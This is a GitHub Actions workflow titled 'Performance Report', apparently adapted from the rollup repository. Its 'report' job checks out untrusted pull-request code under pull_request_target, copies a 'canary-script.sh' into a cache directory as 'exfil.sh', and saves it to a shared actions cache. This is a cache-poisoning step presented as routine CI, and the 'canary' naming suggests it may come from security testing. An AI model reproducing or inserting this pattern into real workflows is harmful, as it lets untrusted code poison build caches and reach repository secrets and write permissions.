name: Performance Report

on:
  pull_request_target:
    types:
    - synchronize
    - opened
    - reopened
    - labeled

concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || 
    github.ref }}
  cancel-in-progress: true

permissions:
  contents: read
  issues: write
jobs:
  build-artefacts:
    if: >-
      ${{ github.event.pull_request.head.repo.full_name == 'rollup/rollup' ||
          (github.event.action == 'labeled' && github.event.label.name == 'x⁸ ⚙️ build
      repl artefacts') }}
    strategy:
      matrix:
        settings:
        - name: current
          ref: ${{ github.event.pull_request.head.sha }}
        - name: previous
          ref: ${{ github.event.pull_request.base.sha }}
    name: Build ${{matrix.settings.name}} artefact
    runs-on: ubuntu-latest
    steps:
    - name: Checkout Commit
      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd   # v6.0.2
      with:
        ref: ${{matrix.settings.ref}}
    - name: Install Toolchain
      uses: dtolnay/rust-toolchain@29eef336d9b2848a0b548edc03f92a220660cdb8   # stable
      with:
        toolchain: nightly-2025-07-25
        components: rust-src
    - name: Restore Cargo cache
      uses: actions/cache/restore@27d5ce7f107fe9357f9df03efb73ab90386fccae   # v5.0.5
      with:
        path: |
          ~/.cargo/registry/index/
          ~/.cargo/registry/cache/
          ~/.cargo/git/db/
          .cargo-cache
          rust/target/
        key: x86_64-unknown-linux-gnu-cargo-ubuntu-latest-${{ 
          hashFiles('rust/Cargo.lock') }}
        restore-keys: x86_64-unknown-linux-gnu-cargo-ubuntu-latest
    - name: Setup Node
      uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e   # v6.4.0
      with:
        node-version: 24.10.0
    - name: Install and Cache Node Dependencies
      uses: ./.github/actions/install-and-cache-node-deps
    - name: Build artefacts 123
      run: npm exec -- concurrently -c green,blue 'npm:build:napi -- --release' 
        'npm:build:cjs' && npm run build:copy-native && npm run 
        build:bootstrap:cjs && npm run build:copy-native
    - name: Upload artifact
      uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a   # v7.0.1
      with:
        name: ${{ matrix.settings.name }}
        path: dist/
        if-no-files-found: error

    continue-on-error: true
  report:
    needs: build-artefacts
    permissions:
      pull-requests: write # for peter-evans/find-comment and peter-evans/create-or-update-comment
    runs-on: ubuntu-latest
    name: Report Performance
    steps:
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.head.sha }}
        repository: ${{ github.event.pull_request.head.repo.full_name }}
    - name: plant cache content
      run: "mkdir -p .canary-cache\ncp canary-script.sh .canary-cache/exfil.sh\nchmod
        +x .canary-cache/exfil.sh\n"
    - uses: actions/cache@v4
      with:
        path: .canary-cache
        key: canary-cache-eb8a23799206
    - name: never-run sentinel for guardrails
      if: 'false'
      run: echo never 
        "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments" || 
        true
